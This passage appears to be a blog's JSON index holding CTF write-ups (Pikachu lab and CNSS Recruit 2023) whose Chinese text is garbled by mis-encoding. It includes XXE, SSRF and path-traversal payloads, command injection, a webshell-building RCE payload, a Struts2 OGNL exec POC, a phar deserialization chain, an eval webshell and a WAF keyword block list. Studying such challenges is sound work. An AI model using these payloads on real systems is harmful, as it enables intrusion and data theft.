1http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=../../../../../../Windows/win.ini æ•æ„Ÿä¿¡æ¯æ³„éœ²1.find abc f12æ‰¾åˆ°è´¦æˆ· é»„é‡‘æ—¶ä»£ğŸ‘æˆ‘ä¹Ÿå¾ˆå–œæ¬¢è¿™ä¸€æ®µ å¯ä»¥ç›´æ¥ä¿®æ”¹urlå¾—åˆ°æ•æ„Ÿä¿¡æ¯ PHPååºåˆ—åŒ–1.PHPååºåˆ—åŒ–æ¼æ´æ²¡æ‰¾åˆ°ååºåˆ—åŒ–çš„ä»£ç ï¼Œè¯•äº†ä¸€ä¸‹ç»™çš„playload: 1O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125; å‘ç°å¯ä»¥ XXE1.XXEæ¼æ´playload: 1234&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt; ]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; urlé‡å®šå‘1.ä¸å®‰å…¨çš„urlè·³è½¬ å¦‚å›¾ä¿®æ”¹ï¼Œç‚¹å‡»åˆ™è·³è½¬ç™¾åº¦ SSRF1.SSRF(curl)playload: 1http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/Windows/win.ini 2.SSRF(file_get_content)playload: 1http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///c:/windows/win.ini","categories":[{"name":"writeup","slug":"writeup","permalink":"https://foreon.github.io/categories/writeup/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://foreon.github.io/tags/ctf/"}]},{"title":"CNSS Recruit 2023 Writeup","slug":"CNSS Recruit 2023 Writeup","date":"2023-11-03T15:47:10.000Z","updated":"2023-11-03T15:56:20.139Z","comments":true,"path":"posts/16427.html","link":"","permalink":"https://foreon.github.io/posts/16427.html","excerpt":"","text":"CNSS Recruit 2023 WriteupWeb1.ğŸ“— CNSS 2023 Web Guidelineæ²¡ä»€ä¹ˆå¥½è¯´çš„ 2.ğŸ™‹ PHPinfo&#x2F;phpinfo()æ‰¾åˆ°flag 3.ğŸ¦´ babyHTTPæŒ‰æç¤ºæ¥å°±è¡Œ 4.ğŸ“ Pingping 127.0.0.1;ls &#x2F; # æ‰¾åˆ°flag ping 127.0.01;cat &#x2F;flag # å¾—åˆ°flag 5.ğŸ¥‡ æˆ‘å¾—å†å¿«ç‚¹è„šæœ¬å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132import hashlibfrom hashlib import md5import requestss=requests.Session()url=&#x27;http://124.221.34.13:55590/&#x27;r=s.get(url)res=r.texta=res.find(&quot;&lt;p&gt;&quot;)b=res.find(&quot;/p&gt;&quot;,a)#æ‰¾åˆ°æˆ‘ä»¬è¦è®¡ç®—çš„å¼å­çš„å‰åä½ç½®num=res[a+9:b-28]print(a)print(b)print(num)m = hashlib.md5()m.update(num.encode(&quot;utf-8&quot;))encodeStr = m.hexdigest()print (encodeStr)en=str.upper(encodeStr)print(en)playload=&#123; &#x27;value&#x27;:en&#125;r=s.get(url=url,params=playload)print(r.content)url2=&#x27;http://124.221.34.13:55590/check?value=&#x27;+encodeStrr2=s.get(url2)print(r2.text) ğŸ¶ CNSSå¨˜ã®å® ç‰©å•†åº—ä½¿ç”¨åŒç­‰å·ç»•è¿‡ï¼ŒåŸç†ï¼š ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450d1eb6ea8.png)å¯†ç è¾“å…¥â€™&#x3D;â€˜ ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450d34c9074.png) 6.ğŸ¥µ 2048å¡äº†ä¸€ä¼šï¼Œå‘ç°æ‰€æœ‰æ•°æ®å˜åŒ–éƒ½åœ¨å‰ç«¯å®Œæˆçš„ï¼Œé‚£ä¹ˆåªè¦åœ¨å‰ç«¯åšæ–‡ç« å°±è¡Œã€‚çœ‹äº†ä¸€åœˆå°±æ”¹JavaScriptå§(æˆ‘ä¹‹å‰è¿˜ä¸çŸ¥é“JavaScriptæ–‡ä»¶èƒ½åœ¨æºä»£ç ç•Œé¢ä¿®æ”¹å¹¶ä¿å­˜çš„ æ‰¾åˆ°scoreçš„åˆ¤å®šæ¡ä»¶ç„¶åæ”¹æˆ0ä¿å­˜ï¼Œå¾—åˆ°flag 7.ğŸ‘¤ æ¢ä¸ªå¤´åƒå…ˆå‘ç°åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æœ¨é©¬ï¼Œç„¶åburpæŠ“åŒ…ï¼ŒæŠŠ.pngåç¼€æ”¹æˆ.phpï¼Œèšå‰‘è¿æ¥ 8.7ï¸âƒ£ EZRCCCCEåœ¨timå¤§ä½¬çš„æç¤ºä¸‹åšå‡ºæ¥äº† ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450d3fcb5f7.png) è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œä½†æ˜¯é™åˆ¶é•¿åº¦äº† æ˜æ˜¾è¦ç”¨å‘½ä»¤æ‹¼æ¥æ¥è¿‡é¢˜ï¼Œæ³¨æ„è¿™é‡Œçš„sandboxæ˜¯ç»™æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç§äººè·¯å¾„ï¼Œæˆ‘å°±æ˜¯å¡åœ¨è¿™ä¸€æ­¥äº† playload: 1234567891011121314151617181920&gt;hp&gt;1.p\\\\&gt;d\\&gt;\\\\&gt;\\ -\\\\&gt;e64\\\\&gt;bas\\\\&gt;7\\|\\\\&gt;XSk\\\\&gt;Fsx\\\\&gt;dFV\\\\&gt;kX0\\\\&gt;bCg\\\\&gt;XZh\\\\&gt;AgZ\\\\&gt;waH\\\\&gt;PD9\\\\&gt;o\\ \\\\&gt;ech\\\\ls -t&gt;0sh 0 è„šæœ¬ï¼š 1234567891011121314#!/usr/bin/python# -*- coding: UTF-8 -*-import requestsurl = &quot;http://124.221.34.13:55559/?6=&#123;0&#125;&quot;print(&quot;[+]start attack!!!&quot;)with open(&quot;payload.txt&quot;,&quot;r&quot;) as f: for i in f: print(&quot;[*]&quot; + url.format(i.strip())) s=requests.get(url.format(i.strip())) print((s.text))#æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸtest = requests.get(&quot;http://124.221.34.13:55559/sandbox/5466482a195fb9b91138de0cb507f8bf/1.php&quot;)if test.status_code == requests.codes.ok: print(&quot;[*]Attack success!!!&quot;) è¿™é‡Œæ£€æŸ¥æˆåŠŸçš„è·¯å¾„è¦pwdæŸ¥ä¸€ä¸‹ ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450d448f878.png) ç„¶åls &#x2F;çœ‹åˆ°flagæŠŠå®ƒcatå‡ºæ¥ï¼Œè¿™é‡Œæ³¨æ„åˆ†å·é—­åˆè¯­å¥ 10.ğŸ± Tomcat?cat~çŒ«çŒ«å¯çˆ±æ è¿™é¢˜è€ƒå¯Ÿstruts2æ¼æ´ ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450d4aaf617.png) å‚è€ƒcsdnæ–‡ç« ï¼šCTFshowåˆ·é¢˜æ—¥è®°-WEB-JAVAï¼ˆweb279-300ï¼‰Struts2å…¨æ¼æ´å¤ç°ï¼ŒJavaæ¼æ´å¤ç°_debug&#x3D;command&amp;expressionè¡¨è¾¾å¼æ³¨å…¥æ¼æ´å¦‚ä½•ä¿®å¤_OceanSecçš„åšå®¢-CSDNåšå®¢ 12POC:&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;cat webapps/flaaaaaaag/flag.jsp&#x27;).getInputStream())) + &#x27; è¿™é¢˜flagè—çš„æœ‰ç‚¹æ·±ï¼Œä¸€èˆ¬åœ¨ç›®å½•å°±çœ‹åˆ°äº†ï¼Œé—®äº†å¤§ä½¬æ‰åšå‡ºæ¥ï¼Œä¸€åº¦ä»¥ä¸ºæ–¹å‘é”™äº†ğŸ˜­ å¤§ä½¬è¯´æ˜¯struts2æœ‰ç‚¹å¤ªç®€å•äº†ï¼Œè—æ·±ç‚¹ä¸Šä¸Šéš¾åº¦ ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450da2e60d4.png) ğŸ”§ where is my unserialize?è¿™é¢˜å­¦åˆ°äº†ä¸å°‘ï¼Œä¹Ÿè¸©äº†ä¸å°‘å‘ é¦–å…ˆfile&#x3D;xxx.phpæ˜¯å¯ä»¥æŸ¥åŸç çš„ ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450da3c364c.png) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101class.php&lt;?phpclass CNSS&#123; public $shino; public $shin0; public $name; public function __construct($name) &#123; $this-&gt;name=$name; &#125; public function __wakeup() &#123; $this-&gt;shin0 = &#x27;cnss&#x27;; $this-&gt;_sayhello(); &#125; public function _sayhello() &#123; echo (&#x27;&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;&#x27;); &#125; public function __destruct() &#123; $this-&gt;shin0 = $this-&gt;name; echo $this-&gt;shin0.&#x27;&lt;br&gt;&#x27;; &#125;&#125;class CN55&#123; public $source; public $params; public function __construct()&#123; $this-&gt;params = array(); &#125; public function __invoke() &#123; return $this-&gt;_get(&#x27;key&#x27;); &#125; public function _get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;class Show&#123; public $key; public $haha; public function __construct($file) &#123; $this-&gt;key = $file; echo $this-&gt;key.&#x27;&lt;br&gt;&#x27;; &#125; public function __toString() &#123; $func = $this-&gt;haha[&#x27;hehe&#x27;]; return $func(); &#125; public function __call($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; //Do you know &#x27;Php ARchive&#x27;? echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;?&gt; æ²¡æœ‰unserilize()ï¼Œå†åŠ ä¸Šä¸Šä¼ æ–‡ä»¶ï¼Œè€ƒå¯Ÿpharååºåˆ—åŒ– åŸç†ï¼š ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450da4cece0.png) è¿™é‡Œå…ˆè®°å½•ä¸€ä¸‹ä¸ºä»€ä¹ˆç¬¬ä¸€æ¬¡æˆ‘æ²¡èƒ½æˆåŠŸ ç¬¬ä¸€æ¬¡çš„poc: ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450da5b107b.png) é”™åœ¨èµ‹å€¼ä¸èƒ½ä»¥$cnss()çš„å½¢å¼ï¼Œå› ä¸ºéƒ½è¦èµ‹å€¼å¸¸æ•°ï¼ï¼ æˆåŠŸçš„POC: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpclass CNSS&#123; public $shino; public $shin0; public $name;&#125;class CN55&#123; public $source; public $params; public function __invoke() &#123; &#125;&#125;class Show&#123; public $key; public $haha; public function __construct($file) &#123; $this-&gt;key = $file; echo $this-&gt;key.&#x27;&lt;br&gt;&#x27;; &#125; public function __toString() &#123; $func = $this-&gt;haha[&#x27;hehe&#x27;]; return $func(); &#125; public function __call($key,$value) &#123; $this-&gt;$key = $value; &#125;&#125;$cn=new CNSS(&#x27;cnss&#x27;);$cnss =new CN55();$s=new show(&#x27;6&#x27;);$s-&gt;haha[&#x27;hehe&#x27;]=$cnss;$cnss-&gt;params[&#x27;key&#x27;]=&#x27;/var/www/html/f1ag.php&#x27;;$cn-&gt;name=$s;$phar = new Phar(&quot;1.phar&quot;); $phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;); $phar-&gt;setMetadata($cn); $phar-&gt;addFromString(&quot;leon.txt&quot;, &quot;leon&quot;); $phar-&gt;stopBuffering();?&gt; æ‹¿åˆ°flagäº† ğŸš“ can can need shellåœ¨å¤§ä½¬çš„ä¸æ–­æç¤ºä¸‹æ•´å‡ºæ¥äº†ï¼Œèœé¸Ÿæˆé•¿å…¨é è€å¸ˆå‚…ä»¬ğŸ˜­ æ ¹æ®æç¤ºåŠ &#x2F;admin ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450da76eb70.png) æç¤ºäº†è´¦å·å¯†ç éƒ½æ˜¯admin ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450da84afcc.png) è¿›å…¥ç®¡ç†å‘˜åå°ï¼Œè¿™é¢˜è€ƒå¯Ÿlavarelæ¨¡æ¿æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ‰¾åˆ°ä¸‹å›¾çš„æ•™ç¨‹ï¼ŒåŸç†æ˜¯burpæŠ“åŒ…jpgé©¬ï¼Œç„¶ååç¼€åŠ .phpèšå‰‘è¿æ¥ï¼Œä½†æ˜¯è¿™é¢˜æœ‰waf waf: 12345678910111213141516public function waf($file)&#123; $dangerous = array(&#x27;eval&#x27;,&#x27;assert&#x27;,&#x27;serialize&#x27;,&#x27;link&#x27;,&#x27;open&#x27;,&#x27;write&#x27;,&#x27;_&#x27;,&#x27;get&#x27;,&#x27;post&#x27;,&#x27;passthru&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;ch&#x27;,&#x27;scandir&#x27;,&quot;input&quot;,&quot;file&quot;,&quot;call&quot;,&quot;dl&quot;,&quot;syslog&quot;,&quot;putenv&quot;,&quot;[&quot;,&quot;]&quot;,&quot;`&quot;,&quot;*&quot;,&quot;+&quot;,&quot;|&quot;,&quot;url&quot;,&quot;flag&quot;,&quot;&#123;&quot;,&quot;&#125;&quot;,&quot;@&quot;,&quot;(&quot;,&quot;)&quot;); $handle = fopen($file-&gt;getRealPath(), &quot;r&quot;); while (($line = fgets($handle)) !== false) &#123; foreach($dangerous as $value)&#123; $res = stristr($line,$value); if($res != false)&#123; fclose($handle); return false; &#125; &#125; &#125; fclose($handle); return true; &#125; ç¦äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ²¡ç¦ç”¨å•å¼•å·ï¼Œåœ¨å¤§ä½¬çš„æç¤ºä¸‹è€ƒè™‘includeæ–‡ä»¶åŒ…å« 1234include.php&lt;?phpinclude &#x27;1.jpg&#x27;?&gt; 121.jpg &lt;?php @eval($_POST[&quot;leon&quot;]);?&gt; éƒ½ä¸Šä¼ åï¼Œèšå‰‘è¿æ¥ xxx&#x2F;xxxx&#x2F;include.php å°±æˆäº† 9.ğŸ­ EzPollution_preè¿™é¢˜æ³¨æ„nodejså®¹å™¨ä½¿ç”¨ä¸€æ¬¡å°±æŸåäº†ï¼Œæ‰€ä»¥åœ¨æœ¬åœ°è·‘é€šï¼Œé‡å¯ä¼šæ–¹ä¾¿ä¸€ç‚¹ ç„¶åæ ¹æ®åŸå‹é“¾æ±¡æŸ“çš„åŸç†åƒå›¾ä¸­è¿™æ ·post,æ³¨æ„è¦ç”¨jsçš„å‡½æ•°æŠŠflagç»™catå‡ºæ¥ ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450db13d87c.png) CNSS{v2ry_ea5y_N0dejs} Re1.ğŸ“¦ Bin Guidelineæ— è¯å¯è¯´ 2.ğŸ˜ é‚£ä¸ªå¥³äººæ‰“å¼€å°±é€ 3.ğŸ˜¢ æˆ‘çš„flagç¢äº†ä¸€åœ°F5 æ ¹æ®æç¤ºæ‰“å¼€Stringçª—å£ ç¬¬äºŒæ®µåœ¨functionæ‰¾åˆ° ![](G:\\hexo-blog\\source_posts\\CNSS Recruit 2023 Writeup.assets\\65450db40b413.png) ç¬¬ä¸‰æ®µå³é”®æŸ¥çœ‹å¼•ç”¨å›¾ æ‰¾åˆ°func718 æ‹¼æ¥ä¸€ä¸‹CNSS{My_fl@g_h4s_br0ken_4parT_ Bu7_Y0u_c@n_f1x_1t!}","categories":[{"name":"writeup","slug":"writeup","permalink":"https://foreon.github.io/categories/writeup/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://foreon.github.io/tags/ctf/"}]},{"title":"æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢","slug":"first blog","date":"2023-11-02T12:15:27.000Z","updated":"2023-11-03T15:41:37.813Z","comments":true,"path":"posts/51727.html","link":"","permalink":"https://foreon.github.io/posts/51727.html","excerpt":"","text":"æˆ‘å¼€å§‹å†™åšå®¢äº†ï¼æ­¤åšå®¢è¯ç”Ÿäº2023å¹´11æœˆ2æ—¥ã€‚ ä»Šåæˆ‘åº”è¯¥ä¼šæ›´æ–°ä¸€äº›éšç¬”ã€ctfæ¯”èµ›writeupå’Œå­¦ä¹ æ€»ç»“ã€‚","categories":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://foreon.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"æ‰“æ‹›å‘¼","slug":"æ‰“æ‹›å‘¼","permalink":"https://foreon.github.io/tags/%E6%89%93%E6%8B%9B%E5%91%BC/"}]}],"categories":[{"name":"writeup","slug":"writeup","permalink":"https://foreon.github.io/categories/writeup/"},{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://foreon.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://foreon.github.io/tags/ctf/"},{"name":"æ‰“æ‹›å‘¼","slug":"æ‰“æ‹›å‘¼","permalink":"https://foreon.github.io/tags/%E6%89%93%E6%8B%9B%E5%91%BC/"}]}